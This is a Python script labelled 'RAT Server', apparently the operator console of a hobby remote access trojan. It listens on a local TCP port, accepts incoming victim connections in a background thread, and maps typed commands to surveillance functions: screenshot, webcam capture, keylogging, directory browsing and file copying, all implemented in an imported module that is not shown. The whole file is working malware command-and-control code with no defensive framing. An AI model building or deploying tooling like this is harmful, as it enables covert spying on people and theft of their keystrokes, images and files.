#!/usr/bin/env python3

# RAT Server

from socket import *
import sys
from server_functions import *
import threading
import select


# MacBook IP address
SERVER_IP = "localhost"
SERVER_PORT = 9090

server_socket = socket(AF_INET, SOCK_STREAM)
server_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

server_socket.bind((SERVER_IP, SERVER_PORT))

server_socket.listen()

server = Server(server_socket)

print("\nServer is online and listening to new connections\n")

server_commands = {
"help" : server.help,
"connections" : server.show_connections,
"exit" : server.exit,
"screenshot" : server.screenshot,
"webcam" : server.webcam,
"keylog" : server.keylog,
"pwd" : server.pwd,
"ls" : server.ls,
"cd" : server.cd,
"copy" : server.copy
}

# adapted from reading https://stackoverflow.com/questions/24871286/create-multi-thread-tcp-server-python-3

def connection_listener(server_socket):
    while server.on:
        client_socket, addr = server_socket.accept()
        print("\nreceived a connection from: {}".format(addr))
        with server.lock:
            server.new_connection(addr, client_socket)
            server.lock.notify_all()
        print("Enter command [type 'help' to display list of commands]: ", end="")  # print the message again since server is still waiting for user input
        sys.stdout.flush()
        

connection_thread = threading.Thread(target=connection_listener, args=(server_socket,))
connection_thread.daemon=True
connection_thread.start()

# adapted from https://stackoverflow.com/questions/41903031/break-out-of-a-while-loop-while-stuck-on-user-input
def get_input(msg):
    print(msg, end="")
    sys.stdout.flush()      # solution used from https://stackoverflow.com/questions/35230959/printfoo-end-not-working-in-terminal
    
    user_input = []
    
    while server.on or not connecting:
        readables, _, _ = select.select([sys.stdin], [], [], 0.1)
        if not readables:
            continue
        user_input = readables[0].readline()
        if user_input[-1] == '\n':
            break

    return user_input


while server.on:
    command = get_input("Enter command [type 'help' to display list of commands]: ").strip()
    
    if command == "":
        continue
    
    command_type = command.split()[0]
    
    if command_type not in server_commands.keys():
        print("Invalid command")
        continue
        
    with server.lock:
        func = server_commands[command_type]
        
        try:
            func(command)
        except CommandError as err:
            print(err.msg)
        except ServerShutdown as err:
            print(err.msg)
            break
# except:
#     print_server_msg("Server shutting down.")
#     server.exit("exit")
#     server_socket.close()
#     sys.exit()